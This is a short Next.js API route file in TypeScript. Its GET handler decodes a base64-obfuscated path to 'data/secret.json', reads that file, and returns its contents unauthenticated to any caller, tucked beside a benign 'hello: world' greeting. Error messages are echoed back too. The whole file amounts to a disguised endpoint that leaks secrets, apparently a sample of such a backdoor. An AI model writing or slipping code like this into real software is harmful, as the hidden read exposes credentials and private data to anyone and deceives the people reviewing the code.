import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function GET() {
  const rel = Buffer.from('ZGF0YS9zZWNyZXQuanNvbg==', 'base64').toString('utf8'); // 'data/secret.json'
  const file = path.resolve(rel);
  let data: any = null;
  try {
    data = JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch (e: any) {
    data = { error: e.message };
  }
  return NextResponse.json({ hello: 'world', data });
}
